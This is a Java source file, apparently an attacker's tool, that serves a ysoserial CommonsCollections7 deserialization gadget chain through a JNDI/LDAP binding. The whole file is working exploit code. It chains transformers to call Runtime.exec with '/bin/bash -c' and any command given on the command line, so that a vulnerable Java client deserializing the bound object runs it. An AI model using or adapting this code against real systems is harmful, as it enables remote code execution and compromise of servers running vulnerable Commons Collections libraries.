/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilLDAPServer5.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import javax.naming.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

public class EvilLDAPServer5
{
    /*
     * ysoserial/CommonsCollections7
     */
    @SuppressWarnings("unchecked")
    private static Object getObject ( String cmd ) throws Exception
    {
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
        Map             normalMap_0 = new HashMap();
        Map             normalMap_1 = new HashMap();
        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
        lazyMap_0.put( "scz", "same" );
        lazyMap_1.put( "tDz", "same" );
        Hashtable       ht          = new Hashtable();
        ht.put( lazyMap_0, "value_0" );
        ht.put( lazyMap_1, "value_1" );
        lazyMap_1.remove( "scz" );
        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
        f.setAccessible( true );
        f.set( tchain, tarray );
        return( ht );
    }

    public static void main ( String[] argv ) throws Exception
    {
        String  name    = argv[0];
        String  cmd     = argv[1];
        Object  obj     = getObject( cmd );
        Context ctx     = new InitialContext();
        ctx.rebind( name, obj );
        System.in.read();
    }
}